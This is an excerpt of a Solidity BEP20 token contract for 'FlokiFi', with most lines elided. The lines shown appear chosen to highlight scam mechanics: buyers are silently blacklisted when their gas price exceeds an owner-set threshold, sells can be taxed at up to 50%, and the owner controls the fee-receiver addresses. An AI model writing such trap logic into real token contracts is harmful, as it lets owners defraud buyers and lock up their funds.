...
contract FLOKIFI is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string  _name = "FlokiFi";
    string  _symbol = "$FLOFI";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0x838D5d207Ddad49322ACbBe7E96474F473c5AeBA;
        teamFeeReceiver = 0x838D5d207Ddad49322ACbBe7E96474F473c5AeBA;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= B2 && recipient != pair) {
            isblacklisted[recipient] = true;
        }

        
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != stakingFeeReceiver && !isTxLimitExempt[recipient]){
    ...
    function Sell_Multiplier(uint256 _sell) external {
        require(islaunched[msg.sender]);
        require(totalFee.mul(sellMultiplier).div(100) < 50, "Sell Tax cannot be more than 50%");
    ...
    function UpdateB2 (uint256 _B2) public onlyOwner {
               B2 = _B2 * 1 gwei; 
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _teamFeeReceiver, address _stakingFeeReceiver, address _devFeeReceiver ) public onlyOwner {
